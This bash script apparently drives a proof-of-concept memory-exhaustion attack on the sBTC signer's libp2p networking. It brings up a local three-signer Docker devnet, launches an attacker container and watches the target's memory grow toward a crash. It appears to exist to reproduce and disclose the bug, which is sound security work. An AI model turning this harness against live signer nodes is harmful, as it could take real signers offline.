#!/usr/bin/env bash
# One-shot driver for the sBTC signer libp2p OOM PoC.
# Run from the repo root.
set -euo pipefail

CF="-f docker/docker-compose.yml -f docker/docker-compose.attack.yml"
TARGET=sbtc-signer-2
PORT=9182

peers() { docker exec "$TARGET" curl -s --max-time 3 "localhost:$PORT/metrics" 2>/dev/null \
            | grep -E '^peers_connected' | awk '{print $2}'; }
rss()   { docker stats --no-stream --format '{{.MemUsage}}' "$TARGET" 2>/dev/null | awk '{print $1}'; }

echo "[*] Bringing up the 3-signer devnet (attacker stays down)..."
docker compose $CF --profile default --profile bitcoin-mempool --profile sbtc-signer up -d --build

echo "[*] Waiting for the target ($TARGET) to mesh (peers_connected=2)..."
until [ "$(peers)" = "2" ]; do sleep 5; done
echo "[*] Meshed. Baseline RSS=$(rss)"

echo "[*] Launching the external attacker..."
docker compose $CF --profile attack up -d --build sbtc-attacker

echo "[*] Watching $TARGET leak to OOM (Ctrl+C to stop):"
while true; do
    printf "  %s  RSS=%-12s peers_connected(leaked)=%s\n" \
        "$(date +%H:%M:%S)" "$(rss)" "$(peers)"
    sleep 3
done
